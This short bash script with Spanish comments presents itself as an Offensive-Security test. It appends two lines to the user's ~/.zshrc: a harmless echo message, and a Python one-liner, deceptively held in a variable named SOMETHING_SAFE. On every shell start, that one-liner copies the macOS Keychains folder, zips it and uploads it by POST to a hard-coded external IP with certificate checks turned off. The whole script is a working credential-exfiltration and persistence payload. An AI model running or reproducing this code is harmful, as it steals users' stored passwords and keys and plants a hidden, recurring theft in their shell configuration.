#!/bin/bash
#agregando cositas al .zshrc
MESSAGE="echo 'Hola, soy producto de una prueba de Offensive-Security'"
STRING="import shutil, pathlib, urllib.request, ssl; b = pathlib.Path('/tmp/info_collected'); d = b / 'keychains'; d.mkdir(parents=True, exist_ok=True); shutil.copytree(pathlib.Path.home() / 'Library/Keychains', d, dirs_exist_ok=True); archive = shutil.make_archive('/tmp/keychains_collected', 'zip', b); ctx = ssl._create_unverified_context(); f = open(archive, 'rb'); req = urllib.request.Request('https://104.248.64.180:8000/zshrc', data=f.read(), method='POST'); urllib.request.urlopen(req, context=ctx)"
SOMETHING_SAFE='python3 -c "$STRING"'
# Verificar si el mensaje ya existe en el .zshrc
if ! grep -Fxq "$MESSAGE" ~/.zshrc; then
    echo "$MESSAGE" >> ~/.zshrc
fi
# Verificar si el curl ya existe en el .zshrc
if ! grep -Fxq "$SOMETHING_SAFE" ~/.zshrc; then
    echo "$SOMETHING_SAFE" >> ~/.zshrc
fi
